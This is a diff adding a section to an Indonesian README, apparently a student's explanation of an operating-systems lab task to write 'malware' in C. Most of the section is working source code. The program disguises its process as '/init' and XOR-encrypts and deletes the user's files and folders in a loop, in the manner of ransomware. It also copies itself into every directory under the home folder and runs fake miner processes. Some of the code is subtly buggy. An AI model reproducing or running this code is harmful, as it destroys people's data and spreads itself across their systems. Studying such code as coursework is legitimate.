@@ -730,6 +730,247 @@ Di akhir, bisa di cek di activity.log dengan hasil berikut :
 ![Image](https://github.com/user-attachments/assets/d75484e9-88dc-4faa-bb3a-b9d89e27ab09)
 
 
+#3 Soal no 3
+
+Untuk soal nomor 3 ini, kita diminta untuk membuat malware. Berikut penjelasan codingannya :
+
+1. main
+```c
+int main(int argc, char *argv[]) {
+    daemonize(argv[0]);
+
+    int child_count = 3;
+    spawn_process(argv[0], "wannacryptor", wannacryptor, NULL);
+    spawn_process(argv[0], "trojan.wrm", trojan, NULL);
+    spawn_process(argv[0], "rodok.exe", rodok, NULL);
+
+    int status;
+    for (int i = 0; i < child_count; i++) wait(&status);
+
+    return 0;
+}
+```
+Fungsi ini adalah titik awal program. Ia memanggil daemonize() untuk mengubah proses menjadi daemon. Kemudian, menjalankan tiga proses anak (wannacryptor, trojan.wrm, dan rodok.exe) menggunakan spawn_process(), yang masing-masing menjalankan fungsi berbeda. Setelah spawn, main() menunggu semua proses anak selesai dengan wait().
+
+2. daemonize
+ ```c
+void daemonize(char *argv0) {
+    prctl(PR_SET_NAME, "/init", 0, 0, 0);
+    strncpy(argv0, "/init", 128);
+
+    pid_t pid = fork();
+    if (pid < 0) exit(1);
+    if (pid > 0) exit(0);
+    if (setsid() < 0) exit(1);
+    umask(0);
+    for (int x = sysconf(_SC_OPEN_MAX); x > 0; x--) close(x);
+}
+```
+Fungsi ini menjadikan proses utama sebagai daemon: mengganti nama proses menjadi "/init" (nama umum proses sistem), melakukan fork agar bisa lepas dari terminal, membuat session baru dengan setsid(), mengatur umask ke nol, dan menutup semua file descriptor.
+
+3. spawn_process
+ ```c
+void spawn_process(char *argv0, char processName[], int (*callback)(char *argv0, char *args[]), char *args[]) {
+    pid_t pid = fork();
+    if (pid < 0 || pid > 0) return;
+
+    prctl(PR_SET_PDEATHSIG, SIGTERM);
+    prctl(PR_SET_NAME, processName, 0, 0, 0);
+    strncpy(argv0, processName, 128);
+    exit(callback(argv0, args));
+}
+```
+Fungsi ini membuat proses anak dengan nama proses khusus. Setelah fork, proses anak akan menjalankan fungsi callback (misalnya wannacryptor) dengan nama proses yang disamarkan menggunakan prctl().
+
+4. wannacryptor
+ ```c
+int wannacryptor() {
+    while (1) {
+        DIR *dir = opendir(".");
+        if (!dir) return 1;
+
+        time_t timestamp = time(NULL);
+        struct dirent *entry;
+
+        while ((entry = readdir(dir)) != NULL) {
+            if (entry->d_name[0] == '.' || entry->d_name == "runme") continue;
+            if (entry->d_type == DT_REG) xor_file(entry->d_name, timestamp);
+            if (entry->d_type == DT_DIR) {
+                char zipname[PATH_MAX];
+                snprintf(zipname, sizeof(zipname), "%s.zip", entry->d_name);
+
+                char *zip_args[] = {"zip", "-qr", zipname, entry->d_name, NULL};
+                run_command("/bin/zip", zip_args);
+
+                xor_file(zipname, timestamp);
+
+                char *rm_args[] = {"rm", "-rf", entry->d_name, NULL};
+                run_command("/bin/rm", rm_args);
+            }
+        }
+
+        closedir(dir);
+        sleep(30);
+    }
+    return 0;
+}
+```
+Fungsi ini mencari file dan direktori di direktori saat ini (.). File biasa akan dienkripsi dengan XOR, sedangkan direktori akan di-zip, kemudian hasil zip-nya dienkripsi, dan direktori aslinya dihapus. Proses ini diulang terus-menerus setiap 30 detik.
+
+5. xor_file
+ ```c
+int xor_file(const char *filename, time_t timestamp) {
+    FILE *file = NULL;
+    unsigned char *file_buffer = NULL, *key = NULL;
+    size_t key_length, file_size, i;
+    int ret = 1;
+
+    key = malloc(32);
+    if (!key) goto cleanup;
+    snprintf((char *)key, 32, "%ld", timestamp);
+    key_length = strlen((char *)key);
+
+    file = fopen(filename, "rb+");
+    if (!file) goto cleanup;
+
+    fseek(file, 0, SEEK_END);
+    file_size = ftell(file);
+    rewind(file);
+
+    file_buffer = malloc(file_size);
+    if (!file_buffer) goto cleanup;
+    if (fread(file_buffer, 1, file_size, file) != file_size) goto cleanup;
+    for (i = 0; i < file_size; i++) file_buffer[i] ^= key[i % key_length];
+    rewind(file);
+    if (fwrite(file_buffer, 1, file_size, file) != file_size) goto cleanup;
+    ret = 0;
+
+cleanup:
+    if (file) fclose(file);
+    free(file_buffer);
+    free(key);
+    return ret;
+}
+```
+Fungsi ini mengenkripsi file dengan metode XOR sederhana. Kunci dihasilkan dari timestamp saat fungsi dijalankan, dan digunakan berulang untuk mengenkripsi setiap byte file.
+
+6. trojan
+ ```c
+int trojan() {
+    char self[1024];
+    ssize_t len = readlink("/proc/self/exe", self, sizeof(self) - 1);
+    if (len == -1) return 1;
+    self[len] = '\0';
+
+    char *filename = basename(self);
+    char *home = getenv("HOME");
+    if (!home) {
+        struct passwd *pw = getpwuid(getuid());
+        if (pw) home = pw->pw_dir;
+    }
+
+    FILE *fp = fopen(self, "rb");
+    if (!fp) {
+        fclose(fp);
+        return 1;
+    }
+    while (1) {
+        cloneFile(home, filename, fp);
+        sleep(30);
+    }
+    fclose(fp);
+    return 0;
+}
+```
+Fungsi ini membaca file executable dirinya sendiri dan menyebarkan salinan tersebut ke seluruh direktori dalam $HOME secara rekursif. Salinan dibuat dengan nama sama dan diberi permission executable.
+
+7. cloneFile
+ ```c
+int cloneFile(char *baseDirpath, char *filename, FILE *file) {
+    DIR *dir = opendir(baseDirpath);
+    char path[PATH_MAX];
+
+    if (!dir) return 1;
+
+    snprintf(path, sizeof(path), "%s/%s", baseDirpath, filename);
+    FILE *dest = fopen(path, "wb");
+    if (!file || !dest) {
+        closedir(dir);
+        return 1;
+    }
+    char buffer[1024];
+    size_t bytes;
+    while ((bytes = fread(buffer, 1, sizeof(buffer), file)) > 0) {
+        fwrite(buffer, 1, bytes, dest);
+    }
+    fclose(dest);
+    chmod(path, 0755);
+
+    struct dirent *entry;
+    char newpath[PATH_MAX];
+    while ((entry = readdir(dir)) != NULL) {
+        if (entry->d_name[0] == '.') continue;
+        if (entry->d_type == DT_REG) continue;
+        if (entry->d_type == DT_DIR) {
+            snprintf(newpath, sizeof(newpath), "%s/%s", baseDirpath, entry->d_name);
+            cloneFile(newpath, filename, file);
+        }
+    }
+    closedir(dir);
+    return 0;
+}
+```
+Fungsi ini menyalin file ke baseDirpath lalu memanggil dirinya sendiri secara rekursif untuk menyalin file ke semua subdirektori. Ini adalah bagian inti dari penyebaran trojan.
+
+8. rodok dan mining
+ ```c
+int rodok(char *argv0, char *args[]) {
+    int MAX_MINER = 10;
+    pid_t pids[MAX_MINER];
+    int status;
+
+    char miner_name[128];
+    char log_miner_name[64];
+    for (int i = 1; i <= MAX_MINER; i++) {
+        snprintf(miner_name, sizeof(miner_name), "mine-crafter-%d", i);
+        snprintf(log_miner_name, sizeof(log_miner_name), "Miner %d", i);
+
+        char *values[1] = {log_miner_name};
+        spawn_process(argv0, miner_name, mining, values);
+    }
+    for (int i = 0; i < MAX_MINER; i++) wait(&status);
+    return 0;
+}
+
+int mining(char *argv0, char *args[]) {
+    while (1) {
+        srand(time(NULL) + getpid());
+        int sleep_time = rand() % 28 + 3;
+
+        char random_hex[65];
+        for (int i = 0; i < 64; i++) {
+            int random_char = rand() % 16;
+            random_hex[i] = (random_char < 10) ? ('0' + random_char) : ('a' + random_char - 10);
+        }
+        random_hex[64] = '\0';
+
+        time_t now = time(NULL);
+        struct tm *tm_info = localtime(&now);
+        char datetime[32];
+        strftime(datetime, sizeof(datetime), "%Y-%m-%d %H:%M:%S", tm_info);
+
+        FILE *log = fopen("/tmp/.miner.log", "a");
+        if (log) {
+            fprintf(log, "[%s][%s] %s\n", datetime, args[0], random_hex);
+            fclose(log);
+        }
+        sleep(sleep_time);
+    }
+    return 0;
+}
+```
+rodok() akan menjalankan hingga 10 proses mining() dengan nama proses berbeda (mine-crafter-1 s/d mine-crafter-10). Masing-masing mining() akan terus menulis hash acak ke /tmp/.miner.log, berpura-pura sebagai proses mining.
+
 
 #4 Soal no 4
 
